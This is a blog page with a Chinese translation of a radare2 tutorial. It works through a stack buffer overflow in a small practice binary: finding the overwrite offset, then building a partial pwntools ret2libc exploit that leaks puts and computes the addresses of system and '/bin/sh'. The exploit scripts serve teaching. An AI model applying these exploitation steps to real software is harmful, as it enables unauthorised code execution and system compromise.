<!DOCTYPE html>
<html lang="en">





<head><meta name="generator" content="Hexo 3.8.0">
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
  <link rel="icon" type="image/png" href="/img/favicon.png">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#005f6b">
  <meta name="description" content="ZJGSU-IS-17">
  <meta name="author" content>
  <meta name="keywords" content>
  <title>【译】Radare2之旅-Part2：Exploitation - AssassinQ</title>

  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">


  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">

<link rel="stylesheet" href="/css/main.css">


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">


<!-- 自定义样式保持在最底部 -->


<link rel="alternate" href="/atom.xml" title="AssassinQ" type="application/atom+xml"><!-- hexo-inject:begin --><!-- hexo-inject:end -->
</head>


<body>
  <!-- hexo-inject:begin --><!-- hexo-inject:end --><header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">&nbsp;<strong>AssassinQ</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">Home</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">Archives</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">Tags</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">About</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">Links</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  Saturday, February 23rd 2019, 11:18 am
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    5.5k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      23 分钟
                  </span>
                

                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <p>翻译自<a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/" target="_blank" rel="noopener">Megabeets</a>。</p>
<a id="more"></a>
<h1 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h1><p>欢迎来到我们<code>radare2</code>之旅的第二部分！在这一部分，我们会涵盖<code>radare2</code>的更多部分，同时这次更注重于二进制漏洞挖掘。</p>
<p>相信大家都一定很期待这第二部分，之后的内容也一定会更快地分享给大家。如果你还没有阅读过这一系列的<a href="https://www.megabeets.net/a-journey-into-radare-2-part-1/" target="_blank" rel="noopener">第一部分</a>，我非常推荐你去读一读。第一部分记录了<code>radare2</code>的基础内容，同时也解释了很多我今天会用到的命令。</p>
<p>在这一部分，我们的目的是对一个简单的程序进行漏洞挖掘与利用。<code>radare2</code>有很多不同的功能可以帮我们对漏洞进行利用，例如保护技术、查找 ROP、生成随机序列、查看寄存器内容等等。你可以在本文末尾找到一份命令对应表。今天我会向你们展示这些强大的功能，同时我们用<code>radare2</code>来绕过在开启<code>ASLR</code>的系统上运行并且有<code>NX</code>保护的程序。我假设大家都已经掌握了以下的预备知识：</p>
<ul>
<li>汇编语言</li>
<li>程序保护技术（<code>NX</code>、<code>ASLR</code>）</li>
<li><a href="https://en.wikipedia.org/wiki/Call_stack" target="_blank" rel="noopener">栈帧结构</a></li>
<li><a href="https://en.wikipedia.org/wiki/Buffer_overflow" target="_blank" rel="noopener">缓冲区溢出</a></li>
<li><a href="https://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank" rel="noopener">面向返回编程</a></li>
<li><a href="https://en.wikipedia.org/wiki/X86_calling_conventions" target="_blank" rel="noopener">x86 调用约定</a></li>
</ul>
<p>熟悉这些知识是很重要的一步，因为文章中我并不会细讲，甚至不会对其解释。</p>
<p><img src="https://www.megabeets.net/uploads/r2_part1_2.png" srcset="/img/loading.gif" alt></p>
<h1 id="更新radare2"><a href="#更新radare2" class="headerlink" title="更新radare2"></a>更新<code>radare2</code></h1><p>首先，我们将<code>radare2</code>更新至其 git 的最新版版：</p>
<pre><code class="shell">$ git clone https://github.com/radare/radare2.git # 如果你还没有克隆下来的话
$ cd radare2
$ ./sys/install.sh
</code></pre>
<p>等待更新完成需要很长一段时间，在这期间不如看些视频放松一会儿。</p>
<h1 id="熟悉程序"><a href="#熟悉程序" class="headerlink" title="熟悉程序"></a>熟悉程序</h1><p>你可以在这里下载<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2" target="_blank" rel="noopener">程序</a>，在这里下载<a href="https://github.com/ITAYC0HEN/A-journey-into-Radare2/blob/master/Part%202%20-%20Exploitation/megabeets_0x2.c" target="_blank" rel="noopener">源码</a>。<br>如果你想自己编译程序，用以下命令：</p>
<pre><code class="shell">$ gcc -m32  -fno-stack-protector megabeets_0x2.c -o megabeets_0x2
</code></pre>
<p>这次的程序与上一次的程序非常相似，只是在<code>main()</code>函数中有一些细微的改变：</p>
<ul>
<li>编译时不使用参数<code>-z execstac</code>来开启<code>NX</code></li>
<li>通过 scanf 来接收用户的输入，而不是通过程序的参数</li>
<li>大部分输出的函数为 puts</li>
<li>对程序的输出做了一点修改</li>
</ul>
<p>这是之前的<code>main()</code>函数：</p>
<pre><code class="cpp">int main(int argc, char *argv[])
{
    printf(&quot;\n  .:: Megabeets ::.\n&quot;);
    printf(&quot;Think you can make it?\n&quot;);
    if (argc &gt;= 2 &amp;&amp; beet(argv[1]))
    {
        printf(&quot;Success!\n\n&quot;);
    }
    else
        printf(&quot;Nop, Wrong argument.\n\n&quot;);

    return 0;
}
</code></pre>
<p>然后现在的<code>main</code>函数是这样的：</p>
<pre><code class="cpp">int main(int argc, char *argv[])
{
    char *input;
    puts(&quot;\n  .:: Megabeets ::.\n&quot;);
    puts(&quot;Show me what you got:&quot;);

    scanf(&quot;%ms&quot;, &amp;input);
    if (beet(input))
    {
        printf(&quot;Success!\n\n&quot;);
    }
    else
        puts(&quot;Nop, Wrong argument.\n\n&quot;);

    return 0;
}
</code></pre>
<p>程序的功能十分简单，并且在前一篇文章中我们已经对它很熟悉了——要求输入字符串，与经过<code>rot13</code>加密的字符串<code>Megabeets</code>比较。故输入应该为<code>Zrtnorrgf</code>。</p>
<pre><code class="shell">$ ./megabeets_0x2

  .:: Megabeets ::.

Show me what you got:
blablablabla
Nop, Wrong argument.

$ ./megabeets_0x2

  .:: Megabeets ::.

Show me what you got:
Zrtnorrgf
Success!
</code></pre>
<p>这些都很简单，但是我们今天的重点并不是破解一个简单的 crackme，而是对其进行漏洞利用。那我们开始吧！</p>
<h1 id="理解漏洞"><a href="#理解漏洞" class="headerlink" title="理解漏洞"></a>理解漏洞</h1><p>对于每一个 PWN 题给出的程序来说，检查程序开了什么保护是一个好习惯。我们可以使用上一篇文章中提到的<code>rabin2</code>，或者直接在<code>radare2</code>的 shell 里执行<code>i</code>命令。因为我们还没有用<code>radare2</code>打开文件，就先用<code>rabin2</code>来看看：</p>
<pre><code class="shell">$ rabin2 -I megabeets_0x2

arch     x86
binsz    6072
bintype  elf
bits     32
canary   false
class    ELF32
crypto   false
endian   little
havecode true
intrp    /lib/ld-linux.so.2
lang     c
linenum  true
lsyms    true
machine  Intel 80386
maxopsz  16
minopsz  1
nx       true
os       linux
pcalign  0
pic      false
relocs   true
relro    partial
rpath    NONE
static   false
stripped false
subsys   linux
va       true
</code></pre>
<p>在标记的几行中，我们可以看到程序开了<code>NX</code>，也就是说栈是不可执行的。还有，该程序没有开启<a href="https://en.wikipedia.org/wiki/Stack_buffer_overflow#Stack_canaries" target="_blank" rel="noopener"><code>Canary</code></a>、<a href="https://en.wikipedia.org/wiki/Position-independent_code" target="_blank" rel="noopener"><code>PIC</code></a>或是<a href="https://tk-blog.blogspot.co.il/2009/02/relro-not-so-well-known-memory.html" target="_blank" rel="noopener"><code>RELRO</code></a>。</p>
<p>现在我们迅速地过一遍程序的执行流，这次我们看一看它的反汇编代码（并不是每次漏洞挖掘都能有源码）。使用<code>radare2</code>的调试模式打开程序：</p>
<pre><code class="shell">$ r2 -d megabeets_0x2
Process with PID 20859 started…
= attach 20859 20859
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32– Your endian swaps
[0xf7782b30]&gt; aas
</code></pre>
<blockquote>
<ul>
<li><code>-d</code> – 用调试模式打开</li>
<li><code>aas</code> – 分析函数、符号以及其他</li>
<li>注意：正如我在前一篇文章所提到的，开始时使用<code>aaa</code>分析是最推荐的方式，因为分析本来就是一个很复杂的过程。我在<a href="https://reverseengineering.stackexchange.com/a/16115/18698" target="_blank" rel="noopener">这篇回答</a>里写了更多——读一下也许会让你的理解更深。</li>
</ul>
</blockquote>
<p>现在我们继续执行程序，直到<code>main</code>函数。只要输入命令<code>dcu main</code>：</p>
<pre><code class="shell">[0xf7797b30]&gt; dcu?
|Usage: dcu Continue until address
| dcu address      Continue until address
| dcu [..tail]     Continue until the range
| dcu [from] [to]  Continue until the range
[0xf7797b30]&gt; dcu main
Continue until 0x08048658 using 1 bpsize
hit breakpoint at: 8048658
</code></pre>
<blockquote>
<ul>
<li><code>dcu</code>代表<code>debug continue until</code></li>
</ul>
</blockquote>
<p>现在让我们输入<code>VV</code>进入图形模式。在第一部分解释过，你可以通过<code>p</code>和<code>P</code>切换视角，通过<code>k</code>/<code>j</code>/<code>h</code>/<code>l</code>分别向上/下/左/右移动，通过<code>g</code>和调用旁的字母跳转函数（例如<code>gd</code>）。</p>
<p>用<code>?</code>来列出所有在图形模式下的命令，同时别忘记<code>R</code>命令 😉</p>
<p><img src="https://www.megabeets.net/uploads/mainsym.png" srcset="/img/loading.gif" alt></p>
<p><code>main()</code>函数是程序要求我们输入的地方，并且它将输入传给<code>sym.beet</code>。通过<code>gc</code>我们跳转到处理我们输入的<code>beet()</code>函数：</p>
<p><img src="https://www.megabeets.net/uploads/beetsym.png" srcset="/img/loading.gif" alt></p>
<p>我们可以看到用户的输入<code>[arg_8h]</code>被复制给一个缓冲区（<code>[local_88h]</code>），然后就是我们在前一篇文章中所看到过的，字符串<code>Megabeets</code>用<code>rot13</code>加密了，所得结果与我们的输入做比较。我们之前了解过，我这里就不做深究。</p>
<p>你有看到什么可以的地方吗？我们的输入没有对长度做检查，然后直接复制到了缓冲区中。这意味着如果我们输入一串超过缓冲区大小的字符串，就能导致栈上的缓冲区溢出。至此，我们找到了漏洞。</p>
<h1 id="规划漏洞利用脚本"><a href="#规划漏洞利用脚本" class="headerlink" title="规划漏洞利用脚本"></a>规划漏洞利用脚本</h1><p>既然我们已经找到了有漏洞的函数，我们需要构造一个 payload 来利用它。我们的目标很明了，就是在系统上成功开一个 shell。首先，我们要确认确实有一个有漏洞的函数，然后我们需要找到一个我们的 payload 可以覆盖栈的偏移。</p>
<p><img src="https://www.megabeets.net/uploads/tumblr_m5vxpy8Cs41qfoh4t.gif" srcset="/img/loading.gif" alt></p>
<p>我们将会使用一个<code>radare2</code>框架中的工具，叫做<code>ragg2</code>。它能够为我们生成一段循环的<a href="https://en.wikipedia.org/wiki/De_Bruijn_sequence" target="_blank" rel="noopener">德布鲁因序列</a>，用来检测覆盖缓冲区的确切的偏移大小。</p>
<pre><code class="shell">$ ragg2 -
&lt;truncated&gt;
 -P [size]       prepend debruijn pattern
&lt;truncated&gt;
 -r              show raw bytes instead of hexpairs
&lt;truncated&gt;

$ ragg2 -P 100 -r
AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh
</code></pre>
<p>我们知道我们的程序通过输入流读取我们的输入，而不是从 shell 中读取我们的输入。故我们将会使用又一个来自<code>radare2</code>工具箱中的工具，<code>rarun2</code>。</p>
<blockquote>
<ul>
<li><p><code>rarun2</code>可以在不同环境、参数、执行权限、文件夹下运行程序，并且覆盖默认的文件描述符（例如<code>stdin</code>）</p>
</li>
<li><p>如果你需要在跑一个程序时使用很长的参数，它会起很大的作用。而且漏洞利用通常都会向输入流传一大堆数据。</p>
</li>
</ul>
</blockquote>
<p>我们需要做以下的三个步骤：</p>
<ul>
<li>使用<code>ragg2</code>将德布鲁因序列写入一个文件</li>
<li>新建一个<code>rarun2</code>配置文件，并且把前一个文件作为<code>stdin</code></li>
<li>让<code>radare2</code>来找到偏移</li>
</ul>
<pre><code class="shell">$ ragg2 -P 200 -r &gt; pattern.txt
$ cat pattern.txt
AAABAACAADAAEAAFAAGAAHAAI… &lt;truncated&gt; …7AA8AA9AA0ABBABCABDABEABFA

$ vim profile.rr2

$ cat profile.rr2
#!/usr/bin/rarun2
stdin=./pattern.txt

$ r2 -r profile.rr2 -d megabeets_0x2
Process with PID 21663 started…
= attach 21663 21663
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32

— Use rarun2 to launch your programs with a predefined environment.
[0xf77c2b30]&gt; dc
Selecting and continuing: 21663

.:: Megabeets ::.

Show me what you got?
child stopped with signal 11

[0x41417641]&gt;
</code></pre>
<p>我们运行程序，并将<em>pattern.txt</em>的内容用<code>rarun2</code>传给<code>stdin</code>，<em>SIGSEV 11</em>。</p>
<blockquote>
<ul>
<li><p>一个信号是一种发送给进程或是一个具体线程的异步通知，这样与之相同的进程就会在某个事件发生时得到提醒。</p>
</li>
<li><p>SIGSEGV（11）信号在访问了某个无效的虚拟内存或段错误后会触发。</p>
</li>
</ul>
</blockquote>
<p>你发现了吗？我们实时的指针现在指向了<code>0x41417641</code>。这是一个无效的地址，它表示了字符串<code>AvAA</code>（小端序及 ascii 码转换），也就是我们送的字符串的一部分。<code>radare2</code>允许我们找到给出的值在德布鲁因序列中的偏移。</p>
<pre><code class="shell">[0x41417641]&gt; wop?
|Usage: wop[DO] len @ addr | value
| wopD len [@ addr]  Write a De Bruijn Pattern of length ‘len’ at address ‘addr’
| wopO value         Finds the given value into a De Bruijn Pattern at current offset
[0x41417641]&gt; wopO `dr eip`
140
</code></pre>
<p>既然我们已经知道需要覆盖返回地址的偏移为 140，我们可以开始编写脚本了。</p>
<h1 id="编写漏洞利用脚本"><a href="#编写漏洞利用脚本" class="headerlink" title="编写漏洞利用脚本"></a>编写漏洞利用脚本</h1><p>我之前也提到过很多次，这篇文章不是教一些漏洞利用的基础知识的，它的目的是展示<code>radare2</code>在漏洞利用中是如何使用的。因此，我不会过多地解释脚本的每个部分。</p>
<p>我们的目标是在系统中产生一个 shell。这有很多种方法，尤其是这样一个程序。为了知道我们能做什么，首先我们需要知道我们不能做什么。我们的程序在开了<code>ASLR</code>地环境下，所以我们不能猜测到<a href="https://en.wikipedia.org/wiki/C_standard_library" target="_blank" rel="noopener"><em>libc</em></a>在内存中的地址。那就可以和<a href="https://en.wikipedia.org/wiki/Return-to-libc_attack" target="_blank" rel="noopener"><em>ret2libc</em></a>说再见了。另外，程序开了<code>NX</code>，这意味栈是不可执行的，所以我们不能直接在栈上放一个<a href="https://en.wikipedia.org/wiki/Shellcode" target="_blank" rel="noopener"><em>shellcode</em></a>然后跳过去。</p>
<p>虽然这些保护让我们不能使用一些漏洞利用技术，然而这不能阻止我们轻松地绕过它们。编写我们的脚本时，需要细心地观察提供给我们的运行库以及函数。</p>
<p>让我们再次通过调试模式打开程序，然后看一看它使用的运行库和函数。先看库：</p>
<pre><code class="shell">
$ r2 -d megabeets_0x2
Process with PID 23072 started…
= attach 23072 23072
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32
— You haxor! Me jane?
[0xf7763b30]&gt; il
[Linked libraries]
libc.so.61 library
</code></pre>
<p><code>il</code>表示<code>Information libraries</code>，即告诉我们程序所使用的运行库。对于该程序来说，只有我们最爱的<em>libc</em>。</p>
<p>现在通过执行<code>ii</code>命令——<code>Information Imports</code>，让我们看看导入的函数。我们可以加上<code>q</code>来减少冗长的输出：</p>
<pre><code class="shell">[0xf7763b30]&gt; ii
[Imports]
ordinal=001 plt=0x08048370 bind=GLOBAL type=FUNC name=strcmp
ordinal=002 plt=0x08048380 bind=GLOBAL type=FUNC name=strcpy
ordinal=003 plt=0x08048390 bind=GLOBAL type=FUNC name=puts
ordinal=004 plt=0x00000000 bind=WEAK type=NOTYPE name=__gmon_start__
ordinal=005 plt=0x080483a0 bind=GLOBAL type=FUNC name=__libc_start_main
ordinal=006 plt=0x080483b0 bind=GLOBAL type=FUNC name=__isoc99_scanf6 imports

[0xf7763b30]&gt; iiq
strcmp
strcpy
puts
__gmon_start__
__libc_start_main
__isoc99_scanf
</code></pre>
<h2 id="计划"><a href="#计划" class="headerlink" title="计划"></a>计划</h2><ul>
<li>泄漏<code>puts</code>的真实地址</li>
<li>计算<em>libc</em>的基址</li>
<li>计算<code>system</code>的地址</li>
<li>在<em>libc</em>中找到包含字符串<code>/bin/sh</code>的地址</li>
<li>调用<code>system(&quot;/bin/sh&quot;)</code>打开一个 shell</li>
</ul>
<h2 id="泄漏puts的地址"><a href="#泄漏puts的地址" class="headerlink" title="泄漏puts的地址"></a>泄漏<code>puts</code>的地址</h2><p>我们需要用到<code>ret2plt</code>来泄漏<code>puts</code>的真实地址。<code>PLT</code>（<em>Procedure Linkage Table</em>）是内存中的结构体，它包括一小段代码，能够跳转到在动态链接时程序之外的函数地址。不管什么时候，我们在<code>.text</code>段看到<code>CALL</code>指令，并不是直接跳到函数。实际上，它跳转到了<code>PLT</code>中的一小段代码，像是<code>func_name@plt</code>这样。这一小段代码跳转到<code>GOT</code>（<em>Global Offset Table</em>）中的列出的该函数的地址。<code>GOT</code>表入口点会指回<code>PLT</code>，同时<code>PLT</code>会调用一个动态链接器来确定该函数的真实地址。下一次调用<code>func_name@plt</code>时，这段代码会直接跳转到<code>GOT</code>表里的函数地址。想要了解更多关于动态链接的知识，我推荐伊恩兰斯泰勒写的<a href="https://www.airs.com/blog/archives/38" target="_blank" rel="noopener">这一系列关于链接器的文章</a></p>
<p>为了达到这个目的，我们需要找到<code>puts</code>在<code>PLT</code>以及<code>GOT</code>中的地址，然后调用<code>puts@plt</code>并且把<code>puts@got</code>作为参数。我们将把这些调用连在一起，在<code>scanf</code>时传给程序。然后我们会返回到我们利用的第二个阶段。<code>puts</code>将会把它真实的地址输出出来。</p>
<pre><code>+---------------------+
|       Stage 1       |
+---------------------+
| padding (140 bytes) |
| puts@plt            |
| entry_point         |
| puts@got            |
+---------------------+
</code></pre><p>编写脚本我们需要使用<a href="https://github.com/Gallopsled/pwntools" target="_blank" rel="noopener"><em>pwnlib</em></a>框架，而且它是我最喜欢的 python 漏洞利用框架。他简化了很多东西，让利用更简便。当然你也可以使用其他你喜欢的方式。</p>
<p>使用<code>pip</code>下载<em>pwntools</em>：</p>
<pre><code class="shell">$ pip install --upgrade pip
$ pip install --upgrade pwntools
</code></pre>
<p>你可以在<a href="http://docs.pwntools.com/en/stable/index.html" target="_blank" rel="noopener">官方文档</a>上了解更多关于<em>pwntools</em>。</p>
<p>这是我们第一阶段的 python 脚本：</p>
<pre><code class="python">from pwn import *

# Addresses
puts_plt =
puts_got =
entry_point =

# context.log_level = &quot;debug&quot;

def main():

    # open process
    p = process(&quot;./megabeets_0x2&quot;)

    # Stage 1

    # Initial payload
    payload  =  &quot;A&quot;*140 # padding
    ropchain =  p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)

    payload = payload + ropchain

    p.clean()
    p.sendline(payload)

    # Take 4 bytes of the output
    leak = p.recv(4)
    leak = u32(leak)
    log.info(&quot;puts is at: 0x%x&quot; % leak)
    p.clean()


if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<p>我们需要填充<code>puts@plt</code>和<code>puts@got</code>的地址，以及程序的入口点。让我们回到<code>radare2</code>并执行以下命令。字符<code>#</code>用于注释，字符<code>~</code>是<code>radare2</code>的 shell 中的内置<code>grep</code>。</p>
<pre><code class="shell">[0xf7763b30]&gt; # the address of puts@plt:
[0xf7763b30]&gt; ?v sym.imp.puts
0x08048390
[0xf7763b30]&gt; # the address of puts@got:
[0xf7763b30]&gt; ?v reloc.puts_20
0x0804a014
[0xf7763b30]&gt; # the address of program’s entry point (entry0):
[0xf7763b30]&gt; ieq
0x080483d0
</code></pre>
<p><code>sym.imp.puts</code>和<code>reloc.puts_20</code>是<code>radare2</code>自动检测到的标志。命令<code>ie</code>表示<code>Information Entrypoint</code>。</p>
<p>现在我们填入我们找到的地址：</p>
<pre><code class="python">...

# Addresses
puts_plt = 0x8048390
puts_got = 0x804a014
entry_point = 0x80483d0

...
</code></pre>
<p>我们执行一下脚本：</p>
<pre><code class="shell">$ python exploit.py
[+] Starting local process ‘./megabeets_0x2’: pid 23578
[*] puts is at: 0xf75db710
[*] Stopped process ‘./megabeets_0x2’ (pid 23578)

$ python exploit.py
[+] Starting local process ‘./megabeets_0x2’: pid 23592
[*] puts is at: 0xf7563710
[*] Stopped process ‘./megabeets_0x2’ (pid 23592)

$ python exploit.py
[+] Starting local process ‘./megabeets_0x2’: pid 23606
[*] puts is at: 0xf75e3710
[*] Stopped process ‘./megabeets_0x2’ (pid 23606)
</code></pre>
<p>我执行了脚本三次，<code>puts</code>的地址每次都会变得不一样。因此我们不能提前预测它的地址。现在我们需要找到<code>puts</code>在<em>libc</em>中的偏移，然后计算出<em>libc</em>的基址。在我们找到基址后，我们可以用偏移计算出<code>system</code>、<code>exit</code>以及字符串<code>/bin/sh</code>的地址。</p>
<p>现在我们的脚本应该是这样：</p>
<pre><code class="python">from pwn import *

# Addresses
puts_plt = 0x8048390
puts_got = 0x804a014
entry_point = 0x80483d0

# Offsets
offset_puts =
offset_system =
offset_str_bin_sh =
offset_exit =

# context.log_level = &quot;debug&quot;

def main():

    # open process
    p = process(&quot;./megabeets_0x2&quot;)

    # Stage 1

    # Initial payload
    payload  =  &quot;A&quot;*140
    ropchain =  p32(puts_plt)
    ropchain += p32(entry_point)
    ropchain += p32(puts_got)

    payload = payload + ropchain

    p.clean()
    p.sendline(payload)

    # Take 4 bytes of the output
    leak = p.recv(4)
    leak = u32(leak)
    log.info(&quot;puts is at: 0x%x&quot; % leak)

    p.clean()

    # Calculate libc base

    libc_base = leak - offset_puts
    log.info(&quot;libc base: 0x%x&quot; % libc_base)

    # Stage 2

    # Calculate offsets
    system_addr = libc_base + offset_system
    binsh_addr = libc_base + offset_str_bin_sh
    exit_addr = libc_base  + offset_exit

    log.info(&quot;system: 0x%x&quot; % system_addr)
    log.info(&quot;binsh: 0x%x&quot; % binsh_addr)
    log.info(&quot;exit: 0x%x&quot; % exit_addr)

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<h2 id="计算真实地址"><a href="#计算真实地址" class="headerlink" title="计算真实地址"></a>计算真实地址</h2><p><em>请注意在文章的这部分，我的结果可能与你的不同。因为我们的 libc 版本不同，所以会产生不同的偏移。</em></p>
<p>首先我们需要找到<code>puts</code>在<em>libc</em>上的偏移。我们再一次打开<code>radare2</code>，继续执行到入口点。做以上步骤的原因是我们在<em>libc</em>载入之前开始调试程序，直到入口点时，运行库才全部加载完。</p>
<p>我们使用<code>dmi</code>命令，将<em>libc</em>和函数作为参数。我加上了<code>~</code>来显示相关的信息。</p>
<pre><code class="shell">$ r2 -d megabeets_0x2
Process with PID 24124 started…
= attach 24124 24124
bin.baddr 0x08048000
Using 0x8048000
Assuming filepath /home/beet/Desktop/Security/r2series/0x2/megabeets_0x2
asm.bits 32
— A C program is like a fast dance on a newly waxed dance floor by people carrying razors – Waldi Ravens

[0xf771ab30]&gt; dcu entry0
Continue until 0x080483d0 using 1 bpsize
hit breakpoint at: 80483d0

[0x080483d0]&gt; dmi libc puts~ puts$
vaddr=0xf758f710 paddr=0x00062710 ord=6490 fwd=NONE sz=474 bind=GLOBAL type=FUNC name=puts

[0x080483d0]&gt; dmi libc system~ system$
vaddr=0xf7569060 paddr=0x0003c060 ord=6717 fwd=NONE sz=55 bind=WEAK type=FUNC name=system

[0x080483d0]&gt; dmi libc exit~ exit$
vaddr=0xf755c180 paddr=0x0002f180 ord=5904 fwd=NONE sz=33 bind=LOCAL type=FUNC name=exit
</code></pre>
<p><em>请注意，在这篇文章发表前，<code>dmi</code>的输出格式就已经改变了。你的结果很有可能与我的有所不同。</em></p>
<p>所有这些<code>paddr=0x000xxxxx</code>是函数在<em>libc</em>上的偏移。现在我们需要在程序中找到<code>/bin/sh</code>的位置。我们将要使用<code>radare2</code>的一些搜索功能。<code>radare2</code>默认在<code>dbg.map</code>，也就是当前内存中查找。我们想要在所有内存中查找则需要设置成：</p>
<pre><code class="shell">[0x080483d0]&gt; e search.in = dbg.maps
</code></pre>
<p>你可以执行<code>e search.in=?</code>查看更多选项。执行<code>Ve</code>配置可视化模式</p>
<p>在<code>radare2</code>中通过<code>/</code>命令查找。让我们看看<code>radare2</code>给我们提供的查找参数：</p>
<pre><code class="shell">|Usage: /[amx/] [arg]Search stuff (see ‘e??search’ for options)
| / foo\x00           search for string ‘foo\0’
| /j foo\x00          search for string ‘foo\0’ (json output)
| /! ff               search for first occurrence not matching
| /+ /bin/sh          construct the string with chunks
| /!x 00              inverse hexa search (find first byte != 0x00)
| //                  repeat last search
| /h[t] [hash] [len]  find block matching this hash. See /#?
| /a jmp eax          assemble opcode and search its bytes
| /A jmp              find analyzed instructions of this type (/A? for help)
| /b                  search backwards
| /B                  search recognized RBin headers
| /c jmp [esp]        search for asm code
| /C[ar]              search for crypto materials
| /d 101112           search for a deltified sequence of bytes
| /e /E.F/i           match regular expression
| /E esil-expr        offset matching given esil expressions %%= here
| /f file [off] [sz]  search contents of file with offset and size
| /i foo              search for string ‘foo’ ignoring case
| /m magicfile        search for matching magic file (use blocksize)
| /o                  show offset of previous instruction
| /p patternsize      search for pattern of given size
| /P patternsize      search similar blocks
| /r[e] sym.printf    analyze opcode reference an offset (/re for esil)
| /R [?] [grepopcode] search for matching ROP gadgets, semicolon-separated
| /v[1248] value      look for an cfg.bigendian 32bit value
| /V[1248] min max    look for an cfg.bigendian 32bit value in range
| /w foo              search for wide string ‘f\0o\0o\0’
| /wi foo             search for wide string ignoring case ‘f\0o\0o\0’
| /x ff..33           search for hex string ignoring some nibbles
| /x ff0033           search for hex string
| /x ff43 ffd0        search for hexpair with mask
| /z min max          search for strings of given size
</code></pre>
<p>提供给我们了许多不同的方式。同时还发心<code>/R</code>能够帮助我们查找 ROP。可惜这篇文章里我们没有打算使用 ROP。但其他情况下，你们写利用脚本时一定很喜欢用它。</p>
<p>我们不需要任何花哨的东西，只用最简单的查找即可。在这之后，我们先找到当前<em>libc</em>载入的地址，然后计算出<code>/bin/sh</code>的偏移。</p>
<pre><code class="shell">[0x080483d0]&gt; / /bin/sh
Searching 7 bytes from 0x08048000 to 0xffd50000: 2f 62 69 6e 2f 73 68
Searching 7 bytes in [0x8048000-0x8049000]
hits: 0
Searching 7 bytes in [0x8049000-0x804a000]
hits: 0 &lt;..truncated..&gt; Searching 7 bytes in [0xf77aa000-0xf77ab000]
hits: 0
Searching 7 bytes in [0xffd2f000-0xffd50000]
hits: 0
0xf7700768 hit1_0 .b/strtod_l.c-c/bin/shexit 0canonica.
</code></pre>
<p><code>r2</code>在内存中找到了<code>/bin/sh</code>。现在我们计算它相对<em>libc</em>基址的偏移：</p>
<pre><code class="shell">[0x080483d0]&gt; dmm~libc
0xf7599000 /usr/lib32/libc-2.25.so
[0x080483d0]&gt; ?X 0xf7700768-0xf7599000
167768
</code></pre>
<p>我们发现<code>/bin/sh</code>相对<em>libc</em>基址的偏移为<code>0x167768</code>。我们把它填进脚本中，并且可以开始我们的最后一个步骤。</p>
